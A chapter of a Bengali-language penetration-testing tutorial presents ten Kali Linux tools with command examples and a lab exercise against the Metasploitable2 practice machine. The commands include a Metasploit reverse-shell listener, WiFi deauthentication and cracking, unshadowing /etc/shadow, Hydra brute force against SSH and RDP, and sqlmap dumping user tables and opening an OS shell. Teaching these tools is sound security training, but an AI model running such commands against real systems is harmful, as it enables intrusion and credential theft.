# অধ্যায় ২৮: Top 10 Kali Linux Tools

## সহজ কথায়:
Kali-তে ৬০০+ tool আছে। কিন্তু আসলে দরকার ১০-১৫টা। এই অধ্যায়ে সেই essential tools-এর practical use শিখবে।

---

## #1: Nmap — Network Scanner

```bash
# Basic scan:
nmap -sS -sV -O 192.168.1.10

# Quick scan:
nmap -F 192.168.1.10

# Vulnerability scan:
nmap --script vuln 192.168.1.10
```
*বিস্তারিত দেখো অধ্যায় ১৩*

---

## #2: Metasploit — Exploitation Framework

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```
*বিস্তারিত দেখো অধ্যায় ২৭*

---

## #3: Burp Suite — Web Application Testing

```bash
# Start:
burpsuite

# Key features:
# 1. Proxy — Intercept requests
# 2. Repeater — Modify + resend
# 3. Intruder — Brute force/fuzzing
# 4. Decoder — Encode/decode
# 5. Scanner — Automated vuln scan (Pro only)
```
*বিস্তারিত দেখো অধ্যায় ২৩*

---

## #4: Wireshark — Packet Analyzer

```bash
# Start:
wireshark

# Useful filters:
http.request
tcp contains "password"
ip.addr == 192.168.1.10

# Follow stream:
Right click → Follow → TCP Stream
```
*বিস্তারিত দেখো অধ্যায় ২০*

---

## #5: Aircrack-ng — WiFi Audit

```bash
# Complete WiFi crack:
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
aircrack-ng -w rockyou.txt capture-01.cap
```
*বিস্তারিত দেখো অধ্যায় ২১*

---

## #6: John the Ripper — Password Cracker

```bash
# Unshadow + crack:
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
john --show hashes.txt

# Specific format:
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

# Other files:
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
pdf2john file.pdf > hash.txt
john hash.txt
```
*বিস্তারিত দেখো অধ্যায় ১৭*

---

## #7: Hashcat — GPU Password Cracker

```bash
# MD5 crack:
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# NTLM (Windows):
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# SHA256:
hashcat -m 1400 -a 0 hashes.txt rockyou.txt

# WPA2:
hashcat -m 22000 handshake.hccapx rockyou.txt

# Show cracked:
hashcat -m 0 --show hashes.txt
```
*বিস্তারিত দেখো অধ্যায় ১৭*

---

## #8: Hydra — Online Brute Force

```bash
# SSH:
hydra -l admin -P rockyou.txt 192.168.1.10 ssh

# FTP:
hydra -l admin -P rockyou.txt 192.168.1.10 ftp

# Web form:
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Multiple users:
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# RDP:
hydra -l administrator -P rockyou.txt rdp://192.168.1.10
```
*বিস্তারিত দেখো অধ্যায় ১৭*

---

## #9: SQLmap — SQL Injection Automation

```bash
# Basic:
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables:
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump data:
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# POST form:
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Cookie auth:
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# Request file:
sqlmap -r request.txt --dbs

# OS shell (if DBA):
sqlmap -u "http://target.com/page?id=1" --os-shell
```
*বিস্তারিত দেখো অধ্যায় ২৪*

---

## #10: Nikto — Web Server Scanner

```bash
# Basic scan:
nikto -h http://192.168.1.10

# Specific port:
nikto -h http://192.168.1.10 -p 8080

# SSL:
nikto -h https://192.168.1.10 -ssl

# Save output:
nikto -h http://192.168.1.10 -o report.html

# Plugin:
nikto -h http://192.168.1.10 -Plugins "apache_expect_xss"
```

### Nikto Output Example:
```
- Server: Apache/2.2.8 (Ubuntu)
- /phpmyadmin/: phpMyAdmin directory
- /doc/: Directory listing
- /test/: Test page found
- Multiple CGI vulnerabilities
```

---

## Bonus: Other Essential Tools

```bash
# Gobuster — Directory + DNS brute force:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/dns/subdomains.txt

# Searchsploit — Exploit search:
searchsploit apache 2.4.18
searchsploit -m 12345  # mirror to current directory

# Netcat — Swiss Army knife:
nc -lvnp 4444           # listener
nc -zv 192.168.1.10 22  # port check
nc 192.168.1.10 80      # banner grab

# Tcpdump — CLI packet capture:
tcpdump -i eth0 -n
tcpdump -i eth0 port 80
tcpdump -i eth0 host 192.168.1.10

# Dirb — Web directory scanner:
dirb http://192.168.1.10

# WhatWeb — CMS detection:
whatweb http://192.168.1.10
```

---

## 💡 ল্যাব এক্সারসাইজ

```
প্রতিটি tool Metasploitable2-এ practice করো:

১. nmap -A 192.168.56.102
২. nikto -h http://192.168.56.102
৩. sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low"
৪. hydra -l msfadmin -P rockyou.txt ssh://192.168.56.102
৫. searchsploit vsftpd 2.3.4

প্রতিটির output note করো।
```

---

## 📌 মনে রাখো

| Tool | Primary Use | Command |
|------|-------------|---------|
| **Nmap** | Scan | `nmap -sV target` |
| **MSF** | Exploit | `msfconsole` |
| **Burp** | Web test | GUI tool |
| **Wireshark** | Packet capture | GUI + filters |
| **Aircrack** | WiFi | `aircrack-ng` |
| **John** | Password (CPU) | `john hashes.txt` |
| **Hashcat** | Password (GPU) | `hashcat -m 0` |
| **Hydra** | Brute force | `hydra -l admin` |
| **SQLmap** | SQLi auto | `sqlmap -u url` |
| **Nikto** | Web scan | `nikto -h url` |

**পরবর্তী — Top 10 Free Cybersecurity Tools (2025)! 🛡️**
